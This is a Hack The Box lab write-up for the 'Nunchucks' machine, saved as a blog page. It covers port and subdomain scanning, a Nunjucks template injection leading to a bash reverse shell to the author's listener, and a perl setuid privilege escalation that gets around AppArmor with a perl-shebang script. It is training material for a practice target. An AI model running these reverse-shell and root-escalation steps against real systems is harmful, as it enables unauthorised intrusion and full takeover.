@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Nunchucks :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Nunchucks - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/nunchucks/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Nunchucks">
+<meta property="og:description" content="**HTB | Nunchucks - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/nunchucks/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Nunchucks.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-14 21:20:19 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/nunchucks/">HTB: Nunchucks</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-14
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/ssti/">SSTI</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/perl/">perl</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/capability/">capability</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/apparmor/">apparmor</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Nunchucks.png"
+    class="post-cover"
+    alt="HTB: Nunchucks"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Nunchucks</strong> starts with a Server-Side Template Injection using the Nunchucks template, yes, the machine name is a hint.</p>
+<p>We will get a reverse shell, and for root we will be abusing perl but it&rsquo;s not that easy because AppArmor is deployed, we will have to bypass it and get to root.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Nmap finds three open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.95.252 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-14 21:32 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 21:32
+</span></span><span style="display:flex;"><span>Scanning 10.129.95.252 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.95.252
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 10.129.95.252
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.95.252
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 21:32, 14.57s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.252
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>443/tcp open  https
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.73 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">71258</span> <span style="color:#f92672">(</span>3.135MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">71258</span> <span style="color:#f92672">(</span>2.850MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>With nmap parameters <strong>-sCV</strong> we can take a deeper look into these ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,80,443 10.129.95.252 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-14 21:33 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.252
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://nunchucks.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Nunchucks - Landing Page
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>nunchucks.htb/organizationName<span style="color:#f92672">=</span>Nunchucks-Certificates/stateOrProvinceName<span style="color:#f92672">=</span>Dorset/countryName<span style="color:#f92672">=</span>UK
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-08-30T15:42:24
+</span></span><span style="display:flex;"><span>|_Not valid after:  2031-08-28T15:42:24
+</span></span><span style="display:flex;"><span>| tls-nextprotoneg:
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| tls-alpn:
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.38 seconds
+</span></span></code></pre></div><h1 id="https-server">HTTPS server<a href="#https-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>In the scan we see the domain <strong>nunchucks.htb</strong>, we have to add it to the <strong>/etc/hosts</strong> so our machine knows where this domain belongs to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Connection from 192.168.10.21:45050
+</span></span><span style="display:flex;"><span>127.0.0.1	localhost
+</span></span><span style="display:flex;"><span>127.0.1.1	h4ckn3t
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>10.129.95.252   nunchucks.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The following lines are desirable for IPv6 capable hosts</span>
+</span></span><span style="display:flex;"><span>::1     localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1 ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2 ip6-allrouters
+</span></span></code></pre></div><p>As we can&rsquo;t do anything with the SSH port, let&rsquo;s go take a look to the website:</p>
+
+  <img src="/img/nun1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="subdomain-fuzzing">Subdomain fuzzing<a href="#subdomain-fuzzing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>It looks very static, I don&rsquo;t think there&rsquo;s much we can do here so as we have a domain let&rsquo;s fuzz for subdomains with <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster vhost -u https://nunchucks.htb -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:          https://nunchucks.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:       GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:      <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:   gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:      10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/07/14 21:42:41 Starting gobuster in VHOST enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Found: store.nunchucks.htb <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4029<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/07/14 21:42:47 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p><strong>store.nunchucks.htb</strong> is valid so let&rsquo;s add it to the /etc/hosts and take a look:</p>
+
+  <img src="/img/nun2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We have an input field:</p>
+
+  <img src="/img/nun3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="ssti">SSTI<a href="#ssti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>As usual let&rsquo;s try some injections:</p>
+
+  <img src="/img/nun4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The Server Side Template Injection test works well, but after trying with the usual payloads we don&rsquo;t get command execution.</p>
+<p>The website is running Node.js, after doing some research we get this:</p>
+
+  <img src="/img/nun5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This is very similar to the machine&rsquo;s name so maybe it&rsquo;s a clue to what we have to do:</p>
+
+  <img src="/img/nun6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>For this to work we need to do it with Burp so let&rsquo;s intercept the petition and test the payload with the command <em>id</em>:</p>
+<p>
+  <img src="/img/nun7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/nun8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>It works! I will get a reverse shell sharing a HTTP server with the bash reverse shell as index.html.</p>
+<p>From the injection I will curl to my server and execute the index with bash, getting a reverse shell to my netcat:</p>
+
+  <img src="/img/nun9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.161/334 0&gt;&amp;1&#39;</span> &gt; index.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.95.252 - - <span style="color:#f92672">[</span>14/Jul/2022 22:03:22<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.252.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.252:33716.
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1041<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$
+</span></span></code></pre></div><p>It works, now let&rsquo;s turn this shell into an interactive tty:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$ ^-lvnp <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>                              reset xterm
+</span></span></code></pre></div><p>And some final touches like the screen size:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$ export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>david@nunchucks:/var/www/store.nunchucks$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">145</span>
+</span></span></code></pre></div><p>Inside david&rsquo;s home directory we can see the user flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>david@nunchucks:~$ cat user.txt
+</span></span><span style="display:flex;"><span>ef0b6a7c099f7*******************
+</span></span></code></pre></div><h1 id="privilege-escalation"><strong><code>Privilege escalation</code></strong><a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>getcap</strong> we can check for the capabilities our user has:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:~$ getcap -r / 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/perl <span style="color:#f92672">=</span> cap_setuid+ep
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span></code></pre></div><h1 id="abusing-perl-setuid-capability">Abusing perl setuid capability<a href="#abusing-perl-setuid-capability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>/usr/bin/perl</strong> has <strong>cap_setuid+ep</strong> this means, if we manage to execute commands with this binary we could change our <strong>uid</strong>, if we make it 0 we will execute commands as root.</p>
+<p>In <strong>GTFOBins</strong> we find a way to exploit this capability:</p>
+
+  <img src="/img/nun10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>For some reason it doesn&rsquo;t work, only for some commands as <em>whoami</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:~$ perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
+</span></span><span style="display:flex;"><span>david@nunchucks:~$ perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>There&rsquo;s must be some sort of restriction going on so let&rsquo;s keep enumerating:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/$ find <span style="color:#ae81ff">\-</span>name perl 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>./usr/bin/perl
+</span></span><span style="display:flex;"><span>./usr/lib/x86_64-linux-gnu/perl
+</span></span><span style="display:flex;"><span>./usr/share/perl
+</span></span><span style="display:flex;"><span>./usr/share/doc/perl
+</span></span><span style="display:flex;"><span>./usr/share/bash-completion/completions/perl
+</span></span><span style="display:flex;"><span>./usr/share/bash-completion/helpers/perl
+</span></span><span style="display:flex;"><span>./usr/share/lintian/overrides/perl
+</span></span><span style="display:flex;"><span>./usr/src/linux-headers-5.4.0-86/tools/perf/scripts/perl
+</span></span><span style="display:flex;"><span>./usr/src/linux-headers-5.4.0-81/tools/perf/scripts/perl
+</span></span><span style="display:flex;"><span>./etc/perl
+</span></span><span style="display:flex;"><span>./etc/apparmor.d/abstractions/perl
+</span></span></code></pre></div><p>There&rsquo;s something about <strong>AppArmor</strong>, which is a security module that allows to restric a program&rsquo;s capabilities.</p>
+<p>In <strong>/etc/apparmor.d</strong> we can find the information about <strong>perl</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/etc/apparmor.d$ ls
+</span></span><span style="display:flex;"><span>abstractions  force-complain  lsb_release      sbin.dhclient  usr.bin.man   usr.sbin.ippusbxd  usr.sbin.rsyslogd
+</span></span><span style="display:flex;"><span>disable       local           nvidia_modprobe  tunables       usr.bin.perl  usr.sbin.mysqld    usr.sbin.tcpdump
+</span></span><span style="display:flex;"><span>david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Last Modified: Tue Aug 31 18:25:30 2021</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;tunables/global&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/perl <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/base&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/nameservice&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/perl&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  capability setuid,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  deny owner /etc/nsswitch.conf r,
+</span></span><span style="display:flex;"><span>  deny /root/* rwx,
+</span></span><span style="display:flex;"><span>  deny /etc/shadow rwx,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  /usr/bin/id mrix,
+</span></span><span style="display:flex;"><span>  /usr/bin/ls mrix,
+</span></span><span style="display:flex;"><span>  /usr/bin/cat mrix,
+</span></span><span style="display:flex;"><span>  /usr/bin/whoami mrix,
+</span></span><span style="display:flex;"><span>  /opt/backup.pl mrix,
+</span></span><span style="display:flex;"><span>  owner /home/ r,
+</span></span><span style="display:flex;"><span>  owner /home/david/ r,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>If we do some research about AppArmor and perl we find information about a bug:</p>
+
+  <img src="/img/nun11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Basically if we put the shebang <em>#!/usr/bin/perl</em> in a .sh file the AppArmor preventions are bypassed, let&rsquo;s check this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>avid@nunchucks:~$ cat pwned.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use POSIX qw<span style="color:#f92672">(</span>setuid<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>POSIX::setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>exec <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>david@nunchucks:~$ ./pwned.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>It works and now we are root!</p>
+<p>This means we have access to the root.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span>549ffc4ed0750*******************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/haircut/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB: Haircut</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/resolute/">
+                <span class="button__text">HTB: Resolute</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
